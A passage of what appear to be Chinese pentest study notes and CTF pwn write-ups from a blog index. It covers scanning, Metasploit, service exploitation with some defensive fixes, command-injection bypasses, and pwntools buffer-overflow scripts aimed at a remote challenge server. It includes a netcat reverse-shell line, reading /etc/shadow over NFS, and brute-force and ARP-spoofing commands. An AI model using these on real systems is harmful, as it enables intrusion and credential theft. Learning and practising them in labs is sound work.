class="markdownIt-Anchor" href="#arping"></a> arping</h3><p>工具可以进行对应的二层主机发现。缺点：无法多个主机同时扫描。</p><h3 id="netdiscover"><a class="markdownIt-Anchor" href="#netdiscover"></a> netdiscover</h3><p>工具可以针对特定子网进行多主机扫描</p><p>-r range -r 192.168.1.0/24  扫描一定范围</p><p>-c count</p><p>-i  device</p><h2 id="三层发现网络层"><a class="markdownIt-Anchor" href="#三层发现网络层"></a> 三层发现（网络层）</h2><p>使用tcp/ip的网络层的协议进行主机发现。一般使用ICMP协议。</p><p>优点：可以发现远程主机，经过路由的主机；速度相对较快。</p><p>缺点：经常被防火墙过滤；速度相比二层发现慢</p><h3 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> ping</h3><p>Linux ping 不指定-c参数 就会一直发送</p><p>Windows ping默认发送四次</p><h3 id="fping"><a class="markdownIt-Anchor" href="#fping"></a> fping</h3><p>针对多个主机进行主机发现</p><p>-g  192.168.1.1/24  对子网段进行主机发现</p><h3 id="hping3"><a class="markdownIt-Anchor" href="#hping3"></a> hping3</h3><p>发送自定义数据包</p><p>-c count  --icmp 也可以使用tcp udp  的选项（使用tcp udp就是四层发现）</p><h2 id="四层发现传输层"><a class="markdownIt-Anchor" href="#四层发现传输层"></a> 四层发现（传输层）</h2><p>优点：可以探测远程主机；比三层发现更可靠</p><p>缺点：时间长</p><h3 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> nmap</h3><p>详细见其他</p><h3 id="hping3-2"><a class="markdownIt-Anchor" href="#hping3-2"></a> hping3</h3><p>hping3 -c count  --tcp(udp) ip地址</p><h1 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h1><p>端口对应的服务信息 是端口扫描所要得到的信息</p><p>端口范围：0~65535</p><p>周知：0-1023</p><p>注册：1024-49151</p><p>动态：49152-65535</p><h2 id="nmap-2"><a class="markdownIt-Anchor" href="#nmap-2"></a> nmap</h2><p>nmap -p 22(Range) 192.168.1.2 --script banner 获取banner信息（获取在该端口上的服务信息）</p><p>nmap -p 0-1023  -sV 192.168.1.1/24 获取目标系统端口服务版本信息（不指定-p参数 就是默认扫描所有端口）</p><p>nmap -O 192.168.1.18 检测操作系统版本信息</p><p>有授权情况下使用：nmap -A -v ipAdress 利用nmap对目标进行完整测试</p><h2 id="dmitry"><a class="markdownIt-Anchor" href="#dmitry"></a> dmitry</h2><p>-p 进行tcp端口扫描 -b 返回banner信息</p><p>dmitry -pb ipAddress(Range)</p><h2 id="netcat"><a class="markdownIt-Anchor" href="#netcat"></a> netcat</h2><p>nc(netcat) -nvz ipAddress portRange</p><p>nc -nv  ip portRange 返回banner信息</p><h1 id="漏洞扫描"><a class="markdownIt-Anchor" href="#漏洞扫描"></a> 漏洞扫描</h1><p>原理：漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应具体漏洞，存在错误扫描。需要进行漏洞验证。</p><p>发送对应验证数据到目标下，根据返回结果判断是否有漏洞存在</p><h2 id="nmap-3"><a class="markdownIt-Anchor" href="#nmap-3"></a> nmap</h2><p>nmap --script vuln ipAdress</p><h2 id="nessus"><a class="markdownIt-Anchor" href="#nessus"></a> nessus</h2><h2 id="metasploit-漏洞利用"><a class="markdownIt-Anchor" href="#metasploit-漏洞利用"></a> metasploit 漏洞利用</h2><p>msfconsole 启动msf</p><p>search xxx（要查找的信息）</p><p>searchsploit xxx 也可以做到同样的事</p><p>use exploit/xxxx/xxx/xxx（模块名字）</p><p>show payloads 显示payloads的信息</p><p>set payload  payload的名字</p><p>show option 显示payload选项</p><p>按照选项完成设置</p><p>exploit 启动利用</p><h2 id="web漏洞扫描"><a class="markdownIt-Anchor" href="#web漏洞扫描"></a> web漏洞扫描</h2><p>常用工具：AWVS、appscan、Nikto、Burpsuite、Owasp-Zap</p><h3 id="nikto"><a class="markdownIt-Anchor" href="#nikto"></a> nikto</h3><p>nikto -host  ipAdress</p><p>nikto 主要针对web应用</p><h3 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap"></a> sqlmap</h3><p>神器：可以扫web并且漏洞利用</p><p>获取数据库的表名、列名、数据</p><h2 id="web神器"><a class="markdownIt-Anchor" href="#web神器"></a> web神器</h2><h3 id="burpsuite"><a class="markdownIt-Anchor" href="#burpsuite"></a> burpsuite</h3><h4 id="证书安装"><a class="markdownIt-Anchor" href="#证书安装"></a> 证书安装</h4><p>打开burp和浏览器将代理打开，访问http://burp ,将证书下载，然后将证书导入浏览器。</p><h4 id="截断设置"><a class="markdownIt-Anchor" href="#截断设置"></a> 截断设置</h4><p>Proxy——&gt;Options-&gt;intercept client requests</p><p>intercept server response</p><p>设置截断Websocket通信以及修改Response的内容</p><p>Proxy——&gt;Options-&gt;Intercept WebSockets Messages</p><p>response modification 可以设置remove all javaScript 移除绕过文件上传中的JS验证</p><p>SSL Pass Through 使用ssl连接到web服务器</p><p>Miscellaneous 杂项设置</p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><h2 id="ftp"><a class="markdownIt-Anchor" href="#ftp"></a> ftp</h2><p>服务器anonymous的用户不关闭可能会造成匿名漏洞的出现（默认开启）</p><p>匿名漏洞利用：可以直接使用nc 连接ftp</p><p>nc 15.1.2.12 21</p><p>nmap --script vuln 192.168.15.3 -p 21</p><p>ftp后门漏洞：vsftpd 2.3.4就有后门漏洞</p><p>如果用户名user中包含:)那么就直接触发监听6200端口的连接的shell ，权限是root</p><p>可以用nc ip 6200</p><p>解决方法：修改配置文件；</p><p>iptables -A  INPUT -p tcp -dport 6200 -j　DROP</p><p>iptables -A OUTPUT -p tcp -sport 6200 -j DROP</p><p>FTP 用户名密码暴力破解</p><p>medusa 暴力破解 ftp登录</p><p>medusa -h ip -u 用户名 -P 字典 -M ftp (也可以用其他模式)</p><p>FTP 使用明文传输</p><p>所以使用arpspoof 进行arp嗅探</p><p>arpspoof -i 网卡 网关ipAdress -t 重定向到的ip地址</p><p>进而可以抓包分析</p><p>登录之后可以使用metasploit 创建反弹shell 上传到ftp服务器</p><p>使用setoolkit</p><p>选择create a payload and listener</p><p>然后选择合适的选项 根据提示进行选择</p><h2 id="ssh-2"><a class="markdownIt-Anchor" href="#ssh-2"></a> SSH</h2><p>apt-get install openssh-server</p><p>ubuntu 搭建ssh客户端：apt-get install putty-tools</p><p>获取 ssh Banner信息 msf方式：</p><p>use auxiliary/scanner/ssh/ssh_version</p><p>show option</p><p>set rhost IP</p><p>set rport 22</p><p>exploit</p><p>nc ip 22</p><p>规避方式： 在sshd_config 加一行DebianBanner no</p><p>ssh 暴力破解：medusa -h ip -U 用户名字典 -P 密码字典 -M ssh</p><p>命令行登录： ssh 用户名@ip地址</p><p>metasploit 利用ssh登录反弹shell</p><p>参考metasploit漏洞利用那一节</p><p>use auxiliary/scanner/ssh/ssh_login</p><p>show options</p><p>…</p><p>run之后</p><p>session -l 查看当前session详细信息</p><p>之后根据具体情况使用</p><p>ssh 安全防护：修改该默认端口 /etc/ssh/sshd_config 修改port ；</p><p>ssh 设置PGP登录 即使用密钥对进行身份验证 生成ssh密钥对，使用puttygen</p><p>ssh-keygen 命令 在linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys ，复制私钥文件到.ssh目录下。使用 puttygen -L “拷贝私钥文件”，将内容复制到authorized_keys文件中。</p><p>ssh 防止暴力破解 ：只采用ssh pgp方式验证登录</p><p>修改/etc/ssh/sshd_config 的PasswordAuthentication 为no</p><p>iptables设置阈值防止暴力破解 ：</p><p>iptables -I INPUT -p tcp --dport 22 -i eth0(网卡) -m state --state NEW recent --set</p><p>iptables -I INPUT -p tcp --dport 22 -i 网卡 -m state --state NEW recent --update --seconds 120 --hitcount 3 -j DROP</p><h2 id="telnet"><a class="markdownIt-Anchor" href="#telnet"></a> telnet</h2><p>默认使用23端口 明文传输</p><p>nmap -sV  ip</p><p>msfconsle 漏洞利用</p><p>参考msf漏洞利用的方式</p><p>session -l  会话详细信息</p><p>session -i id 使用对应会话</p><p>提权 exploit-db下载</p><p>nc -lvp port 设置监听端口</p><p>echo ‘#!/bin/sh’ &gt; /tmp/run</p><p>echo ‘/bin/netcat -e /bin/sh ipAdress port’ &gt;&gt; /tmp/run</p><p>ps -edf | grep udev</p><p>./exploit (名字) 具有root权限的pid-1  执行</p><h2 id="smtp"><a class="markdownIt-Anchor" href="#smtp"></a> smtp</h2><p>telnet ip 端口</p><p>vrfy 用户名 存在则返回252 不存在则返回550</p><p>metasploit 有smtp_enum用户名枚举模块 smtp_version SMTP版本</p><p>smtp-user-enum 是专门用来进行smtp用户名枚举的工具</p><p>smtp-user-enum -M VRFY -U  字典 -t rhost</p><p>ismtp -h ip:25 -e 邮箱字典</p><h2 id="nfs"><a class="markdownIt-Anchor" href="#nfs"></a> NFS</h2><p>rpcbind 运行在111端口nfs在2049端口</p><p>需要在nfs配置开启rpcbind_enable = “YES”</p><p>nmap -p 111 --script=rpcinfo ip</p><p>探测rpcinfo信息</p><p>metasploit : use auxiliary/scanner/misc/sunrpc_portmapper</p><p>扫描rpc信息</p><p>nmap --script=nfs-* ipAdress 探测目标</p><p>使用showmount 命令确定/共享 需要先安装 apt-get install nfs-common</p><p>showmount -e ip</p><p>查看导出内容</p><p>mkdir nfs_root</p><p>mount -t nfs ip：/~/nfs_root -o nolock</p><p>cat ~/nfs_root/etc/shadow</p><h2 id="smb"><a class="markdownIt-Anchor" href="#smb"></a> SMB</h2><p>samba是linux和unix系统上实现SMB协议的一个免费软件，SMB是一种在局域网上共享文件和打印机的一种通信协议，为局域网中不同计算机之间提供为文件及打印机等资源的共享服务。</p><p>一般运行在139、445端口</p><p>metasploit 使用samba漏洞利用</p><h2 id="rlogin"><a class="markdownIt-Anchor" href="#rlogin"></a> rlogin</h2><p>rlogin是一个unix命令，它允许授权用户进入网络中的其他unix机器并且就像用户在现场操作一样，一旦进入主机，用户可以操作主机允许的任何事情</p><p>512端口 exec服务513端口 login 字段就是表示rlogin开启的标识</p><p>rlogin -l root ip 登陆目标机器</p><p>防御修复</p><p>1、添加root验证登录密码</p><p>2、关闭rlogin服务、改用ssh等来管理服务器</p><h2 id="反序列化远程命令执行漏洞"><a class="markdownIt-Anchor" href="#反序列化远程命令执行漏洞"></a> 反序列化远程命令执行漏洞</h2><p>java rmi 远程调用另一个Java虚拟机对象方法</p><p>1099端口  一般为exploit/multi/misc/java_rmi_server 漏洞利用metasploit</p><p>防御修复：</p><p>1、存在反序列化传输时注意是否可以执行系统命令</p><p>2、存在有缺陷的第三方库要及时升级如commons-collections 要及时升级库或替代或修改命令执行权限</p><h2 id="后门连接"><a class="markdownIt-Anchor" href="#后门连接"></a> 后门连接</h2><p>nmap -sV -p 1524 ip 有些情况下，服务器可能存在某些后门，</p><p>可以使用nmap探测</p><p>nc连接后门 nc IP 端口号</p><h2 id="nfs获取目标密码文件"><a class="markdownIt-Anchor" href="#nfs获取目标密码文件"></a> nfs获取目标密码文件</h2><p>nfs一般开启在2049端口</p><p>nmap --script=nfs-* IP</p><p>showmount 命令确定&quot;/&quot;共享文件系统的根是否可以导出</p><p>showmount属于nfs-common的内容，apt-get install nfs-common</p><p>showmount -e IP</p><p>查看导出内容</p><p>mkdir nfs_root</p><p>mount -t nfs ipAdress:/ ~/nfs_root/ -o nolock</p><p>nolock 是指导出不进行任何加密</p><p>cat  ~/nfs_root/etc/shadow 查看密码文件</p><p>防御措施：做好权限控制</p><h2 id="proftpd测试"><a class="markdownIt-Anchor" href="#proftpd测试"></a> proftpd测试</h2><p>nmap -sV  -p 2121 IP 探测服务</p><p>可以在</p><p><a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>  搜索漏洞</p><p>防御建议：升级；加强监控措施</p><h2 id="mysql弱口令破解"><a class="markdownIt-Anchor" href="#mysql弱口令破解"></a> mysql弱口令破解</h2><p>nmap -sV -p3306 IP</p><p>mysql 默认在3306端口</p><h2 id="postgresql数据库利用"><a class="markdownIt-Anchor" href="#postgresql数据库利用"></a> postgresql数据库利用</h2><p>nmap -sV  -p 5432 IP</p><p>msf ：搜索模块postgres</p><p>pgAdmin 是相应数据库管理软件</p><p>防御方案：屏蔽任意IP连接postgresql</p><p>修复：升级版本；安全配置</p><h2 id="vnc密码破解"><a class="markdownIt-Anchor" href="#vnc密码破解"></a> vnc密码破解</h2><p>nmap -sV -p5900 IP</p><p>vnc viewer 可以用来连接vnc客户端，查看界面</p><p>防御措施：密码设复杂点；登录失败的限制；ip限制</p><h2 id="irc后门利用"><a class="markdownIt-Anchor" href="#irc后门利用"></a> IRC后门利用</h2><p>IRC（Internet Relay Chat）</p><p>nmap -sV -p6667 IP</p><p>searchsploit UnrealIRCd搜索当前IRC是否存在漏洞</p><p>修复防御方案：升级软件；不用</p><h2 id="tomcat密码破解"><a class="markdownIt-Anchor" href="#tomcat密码破解"></a> tomcat密码破解</h2><p>nmap -sV -p 8180 IP</p><h2 id="杂项笔记"><a class="markdownIt-Anchor" href="#杂项笔记"></a> 杂项笔记</h2><p>布尔型注入没有回显则使用‘注入看回显<br />编码格式型注入<br />大小写<br />waf：判断是不是数字也是可以绕过的<br />绕过空格:使用$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>9</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">9,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">9</span><span class="mpunct">,</span></span></span></span>{IFS}, 重定向符<br />绕过黑名单:</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">●字符串拼接，a&#x3D;g;cat fla$a<br>●编码绕过iecho &quot;Y2F0IGZsYWc&#x3D; &quot;|base64 -d^<br>●单引号，双引号c&quot;&quot;at flag<br>●反斜线, c\at fl\ag<br>●使用通配符&#x2F;???&#x2F;??t fl??<br></code></pre></td></tr></table></figure><p>Windows文件_上传特性举例</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">利用步骤:<br>1.先上传shell.php:.jpg,得到空的shell.php<br>2.再上传shell.&lt;&lt;&lt;,会覆盖原有的shell.php<br>3.即可得到webshell<br></code></pre></td></tr></table></figure><p>序列化字符逃逸</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">代码中将序列化后的数据中的x替换为yy，正常的序列化数据为<br>a:2:&#123;i:0;s:6:&quot; peri0d&quot;;i:1;s:5:&quot; aaaaa&quot;;&#125;<br>如果我们可以控制用户名去修改密码，那么应该这么构造<br>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;<br>也就是说我们需要“;:1;s:6:&quot;123456“;&#125; 这么多个长度的字符空间<br>filter函数将x变为yy， 我们填充20个x即可满足<br></code></pre></td></tr></table></figure><p>审计高危函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">●命令执行函数exec(）、passthru()、 system()、 shell exec()、 popen() 等;<br>●代码执行函数: eval)、 assert(、 preg. repace()、 uasort() 等;<br>●文件包含函数include(、require()等,<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn</title>
      <link href="/2020/07/15/pwn/"/>
      <url>/2020/07/15/pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="保护措施"><a class="markdownIt-Anchor" href="#保护措施"></a> 保护措施</h1><h2 id="1relro"><a class="markdownIt-Anchor" href="#1relro"></a> 【1】RELRO：</h2><p>RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表</p><h2 id="2stack"><a class="markdownIt-Anchor" href="#2stack"></a> 【2】Stack：</h2><p>如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</p><h2 id="3nx"><a class="markdownIt-Anchor" href="#3nx"></a> 【3】NX：</h2><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过</p><h2 id="4pie"><a class="markdownIt-Anchor" href="#4pie"></a> 【4】PIE：</h2><p>PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址</p><h2 id="5fortify"><a class="markdownIt-Anchor" href="#5fortify"></a> 【5】FORTIFY：</h2><p>FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> level2</h2><p>题目说明是ROP</p><p>checksec 查看信息</p><p>在ida中发现有system和binsh</p><p>根据相应地址写shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br><br>p=remote(<span class="hljs-string">'220.249.52.133'</span>,<span class="hljs-string">'59893'</span>)<br>systemaddr=<span class="hljs-number">0x08048320</span><br>binshaddr =<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">88</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">4</span>+p32(systemaddr)+p32(<span class="hljs-number">0</span>)+p32(binshaddr)<br>p.recvuntil(<span class="hljs-string">"Input:\n"</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="cgpwn2"><a class="markdownIt-Anchor" href="#cgpwn2"></a> cgpwn2</h2><p>CGCTF的pwn题</p><p>checksec 查看信息</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715134523732.png" alt="image-20200715134523732" /></p><p>可以发现是32位的小端存储，而且只开了NX 和 RELRO</p><p>在ida中发现</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715141258100.png" alt="image-20200715141258100" /></p><p>system函数的地址；和发现漏洞函数gets<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715141406990.png" alt="image-20200715141406990" /></p><p>编写利用程序：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br><br>p=remote(<span class="hljs-string">'220.249.52.133'</span>,<span class="hljs-string">'49372'</span>)<br>systemaddr=<span class="hljs-number">0x08048420</span><br>hookaddr  =<span class="hljs-number">0x0804A080</span><br>catflag=<span class="hljs-string">"/bin/sh"</span><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x2A</span>+p32(systemaddr)+p32(<span class="hljs-number">0</span>)+p32(hookaddr)<br>p.recvuntil(<span class="hljs-string">"please tell me your name"</span>)<br>p.sendline(catflag)<br>p.recvuntil(<span class="hljs-string">"hello,you can leave some message here:"</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715141209022.png" alt="image-20200715141209022" /></p><h2 id="hello_pwn"><a class="markdownIt-Anchor" href="#hello_pwn"></a> Hello_pwn</h2><p>先用checksec查看信息；</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715142008010.png" alt="image-20200715142008010" /></p><p>可知采用amd64位小端存储的结构；</p><p>利用ida进行分析，发现system函数</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715142528087.png" alt="image-20200715142528087" /></p><p>在main函数：<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715142942312.png" alt="image-20200715142942312" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715143104006.png" alt="image-20200715143104006" /></p><p>发现system函数调用方法；发现read只用了4个字节，而其赋予了10个字节；覆写DWORD_60106c的内容；<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715143427786.png" alt="image-20200715143427786" /></p><p>通过判定条件，然后就自动在服务器cat flag了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br><br>p=remote(<span class="hljs-string">'220.249.52.133'</span>,<span class="hljs-string">'38374'</span>)<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x4</span>+p64(<span class="hljs-number">0x6E756161</span>)<br>p.recvuntil(<span class="hljs-string">"lets get helloworld for bof"</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby_pwn"><a class="markdownIt-Anchor" href="#baby_pwn"></a> baby_pwn</h2><p>经过checksec发现以下信息</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200715144524191.png" alt="image-20200715144524191" /></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
